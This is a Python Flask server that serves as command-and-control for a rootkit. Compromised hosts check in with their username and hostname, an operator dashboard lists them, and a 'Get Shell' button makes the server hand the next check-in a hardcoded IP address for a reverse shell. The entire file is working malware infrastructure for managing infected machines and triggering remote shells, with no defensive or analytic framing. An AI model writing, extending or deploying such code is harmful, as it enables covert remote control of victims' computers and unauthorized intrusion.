from flask import Flask, request, redirect
import datetime
from base64 import b64decode, b64encode

DEBUG = False
SHELL_IP = "192.168.1.40"#"127.0.0.1"

app = Flask(__name__)

ClientDatas = {}

class ClientData:
    def __init__(self, username, host, ip):
        self.username = username
        self.host = host
        self.ip = ip
        self.last_time = get_time()
        self.shell_pending = False

    def update_time(self):
        self.last_time = get_time()

    def get_id(self):
        return "%s@%s@%s" % (self.username, self.host, self.ip)

    def get_row(self):
        content = "<tr>"
        for d in self.__dict__.values():
            content += "<td>%s</td>" % d
        content += """<td><form action='/shell' method='post'>
        <input type='hidden' name='id' value='%s'>
        <input type='submit' name='shell' value='Get Shell'>
        </form></td>""" % b64encode(self.get_id().encode()).decode()
        content += "</tr>"
        return content


def get_time():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


@app.route('/')
def hello():
    if not ClientDatas: return "<h1>There's nothing here daddy</h1>"
    content = """<html>
    <head>
    <style>
        table, th, td {
            border: 1px solid black;
            border-collapse: collapse;
        }
    </style>
    </head>
    <body>
    <h1>Welcome daddy</h1>
    <table><tr>"""
    for key in list(ClientDatas.values())[0].__dict__.keys():
        content += "<td>%s</td>" % key.title()
    content += "<td>Shell</td>"
    content += "</tr>"
    
    for c in ClientDatas.values():
        content += c.get_row()
    
    content += "</table></body></html>"
    return content

# Rootkit posts here, updates data in server and checks
# if it shoudl provide a shell
@app.route('/update', methods=["POST"])
def update():
    c = ClientData(request.form["username"], request.form["host"], request.remote_addr)
    c_id = c.get_id()
    if not c_id in ClientDatas.keys():
        ClientDatas[c_id] = c
    
    ClientDatas[c_id].update_time()
    content = SHELL_IP if ClientDatas[c_id].shell_pending else "0"
    ClientDatas[c_id].shell_pending = False
    return content

# POST FROM WEB TO GET A SHELL
@app.route("/shell", methods=["POST"])
def shell():
    client_id = b64decode(request.form["id"].encode()).decode()
    c = ClientDatas.get(client_id)
    if not c:
        return "Invalid id"
    c.shell_pending = True
    return redirect("/")

if __name__ == '__main__':
    app.run(port=12345, debug=DEBUG)